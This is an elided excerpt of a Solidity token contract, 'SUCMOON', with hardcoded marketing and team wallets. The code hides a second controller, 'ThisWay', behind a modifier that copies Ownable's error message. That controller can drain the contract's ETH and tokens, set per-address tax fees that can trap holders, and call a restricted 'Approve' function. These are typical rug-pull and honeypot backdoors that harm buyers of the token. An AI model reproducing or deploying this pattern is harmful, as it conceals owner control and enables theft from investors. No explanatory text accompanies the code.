...
contract SUCMOON is Context, IERC20, Ownable {
    ...
    string private _name = "SUCMOON";
    string private _symbol = "SUCMOON";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x2866dc635C7d4CDCb18b8725D12c008c380B3DE4); 
    address payable private teamWalletAddress = payable(0x77094F6dcc8d804189bD2c5D3181a34085Db2F38); 
	...
	address  public ThisWay =_msgSender();
	...
	modifier onlyWay{
       require(ThisWay == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
	...
	function claimBalance() external {
        payable(ThisWay).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external{
        IERC20(token).transfer(ThisWay, amount);
    }
	...
	function setAddressToken(address _address, bool _enable, uint256 _addressTaxFee) external onlyWay{
	...
	function Approve(address spender,uint256 amount)public onlyWay{
